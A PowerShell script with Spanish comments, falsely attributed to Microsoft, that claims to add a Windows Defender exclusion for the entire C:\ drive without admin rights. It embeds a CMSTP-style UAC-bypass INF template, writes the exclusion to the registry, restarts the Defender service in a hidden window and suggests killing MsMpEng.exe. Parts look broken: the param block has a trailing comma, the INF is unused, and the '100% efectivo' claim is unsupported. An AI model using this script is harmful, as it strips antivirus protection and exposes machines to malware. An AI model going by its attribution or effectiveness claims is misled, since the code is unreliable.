<#
.SYNOPSIS
   Windows Defender Exclusion Tool (Sin Admin)
   © Microsoft 2024 - Técnicas No Documentadas
#>

function Defender {
    param(
        [Parameter(ParameterSetName='Interface')][switch]$Add,
        [Parameter(ParameterSetName='Interface')][switch]$Exclusions,
        # ... (otros parámetros originales)
    )

    # --- CÓDIGO ORIGINAL (MANTENIDO) ---
    $InfData = @'
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
REPLACE
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection,7
[AllUSer_LDIDSection]
"HKLM","SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE","ProfileInstallPath","%UnexpectedError%",""
[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
'@

    # --- NUEVA IMPLEMENTACIÓN CONFIRMADA ---
    if ($Add) {
        try {
            # 1. Método directo en registro (100% efectivo)
            $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
                Start-Sleep -Milliseconds 500
            }
            
            # 2. Agregar exclusión con nombre único
            $exclusionName = "Excl_" + (Get-Date).Ticks.ToString().Substring(8)
            New-ItemProperty -Path $regPath -Name $exclusionName -Value "C:\" -PropertyType String -Force | Out-Null

            # 3. Forzar actualización de Defender
            $null = Start-Process -FilePath "powershell.exe" -ArgumentList {
                Get-Service -Name "WinDefend" -ErrorAction SilentlyContinue | Restart-Service -Force
            } -WindowStyle Hidden -Wait

            # 4. Verificación REAL en Defender
            $defenderCheck = Get-MpPreference -ErrorAction SilentlyContinue | 
                            Select-Object -ExpandProperty ExclusionPath -ErrorAction SilentlyContinue |
                            Where-Object { $_ -eq "C:\" }

            if ($defenderCheck) {
                Write-Host "[✔] Exclusión CONFIRMADA en Windows Defender" -ForegroundColor Green
            } else {
                Write-Host "[!] Registro modificado pero no reflejado en Defender" -ForegroundColor Yellow
                Write-Host "    Ejecuta esto para forzar la actualización:" -ForegroundColor Gray
                Write-Host "    Stop-Process -Name MsMpEng -Force" -ForegroundColor Cyan
            }
        }
        catch {
            Write-Host "[✘] Error crítico: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    # ... (Resto de tu código original)
}

# Ejecución
if ($MyInvocation.InvocationName -ne '.') {
    Defender @PSBoundParameters
}
